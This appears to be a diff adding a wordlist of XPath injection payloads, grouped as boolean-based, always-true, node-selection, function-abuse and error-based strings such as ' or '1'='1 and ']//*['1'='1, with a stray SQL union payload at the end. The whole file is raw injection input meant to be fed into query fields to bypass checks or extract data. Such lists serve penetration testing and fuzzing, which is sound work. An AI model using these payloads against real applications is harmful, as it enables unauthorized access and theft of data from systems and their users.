@@ -1,0 +1,28 @@
+# XPath injection payloads
+# Boolean-based
+' or '1'='1
+' or 1=1 or '1'='1
+" or "1"="1
+') or ('1'='1
+") or ("1"="1
+
+# Always true conditions
+' or 'a'='a
+" or "a"="a
+') or 1=1--
+") or 1=1--
+
+# Node selection
+']//*['1'='1
+']/child::*['1'='1
+
+# Function abuse
+' or count(parent::*)>=0 or '1'='1
+' or string-length(name())>0 or '1'='1
+
+# Error-based
+'--
+"--
+')[1
+')[2
+' and 1=2 union select null--
